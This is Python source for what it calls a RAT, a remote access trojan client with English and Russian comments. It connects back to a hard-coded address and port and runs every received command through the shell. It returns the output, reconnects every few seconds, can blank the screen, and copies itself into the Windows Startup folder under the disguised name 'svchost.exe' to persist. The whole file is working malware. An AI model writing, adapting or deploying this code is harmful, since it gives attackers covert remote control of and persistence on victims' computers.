import socket
import os
import time
import sys

while True:
    try:
        sock = socket.socket()
        sock.connect(("192.168.1.47", 9696))
        while True:
            try:
                comm = sock.recv(1024).decode()
                res_bytes = os.popen(comm)
                result = res_bytes.read()
                if comm == 'downcli':
                    exit()
                elif comm == 'screenoff':
                    if sys.platform.startswith('linux'):
                        os.system("xset dpms force off")

                    elif sys.platform.startswith('win'):
                        import win32gui
                        import win32con
                        from os import getpid, system
                        from threading import Timer


                        def force_exit():
                            pid = getpid()
                            system('taskkill /pid %s /f' % pid)
                        t = Timer(1, force_exit)
                        t.start()
                        SC_MONITORPOWER = 0xF170
                        win32gui.SendMessage(win32con.HWND_BROADCAST, win32con.WM_SYSCOMMAND, SC_MONITORPOWER, 2)
                        t.cancel()
                    sock.send("Screen offed...".encode())
                elif comm[:2] == "cd":
                    try:
                        # Send command arguments to os.chdir / Отправка аргументов команды в os.chdir
                        os.chdir(comm[3:])
                        pwd = os.getcwd()
                        sock.send(bytes(pwd, encoding="utf-8", errors="ignore"))
                    except Exception as ex:
                        sock.send(bytes("Error:\n" + str(ex) + "\n", encoding="utf-8", errors="ignore"))

                # PWD

                elif comm == "pwd":
                    try:
                        # Variable with current directory / Переменная с текущей директорией
                        pwd = os.getcwd()
                        sock.send(bytes(pwd, encoding="utf-8", errors="ignore"))
                    except Exception as ex:
                        sock.send(bytes("Error:\n" + str(ex) + "\n", encoding="utf-8", errors="ignore"))
                elif comm == 'autorun':
                        # Name of the compiled file / Имя скомпилированного файла
                        filename = "svcnost.exe"
                        # Windows username/ Имя пользователя Windows
                        username = os.getlogin()
                        # Path to startup folder / Путь к папке с автозагрузкой
                        startup = (r'C:/Users/' + username + r'/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/')

                        # Check if file already exist / Проверка существует ли файл
                        if os.path.exists(str(startup + r'svchost.exe')) == True:
                            # Sending message / Отправляем сообщение
                            sock.send(bytes("\nRAT already at startup folder\n", encoding="utf-8", errors="ignore"))
                        else:
                            os.system("copy " + filename + " " + '"' + startup + '"' + r'svchost.exe')
                            # Sending message / Отправляем сообщение
                            sock.send(bytes("\nRAT added at startup folder\n", encoding="utf-8", errors="ignore"))
                else:
                    if len(result) == 0:
                        sock.send("No result or error".encode())
                        continue
                    else:
                        sock.send(result.encode())
                        continue
            except:
                break
    except:
        time.sleep(5)
        continue
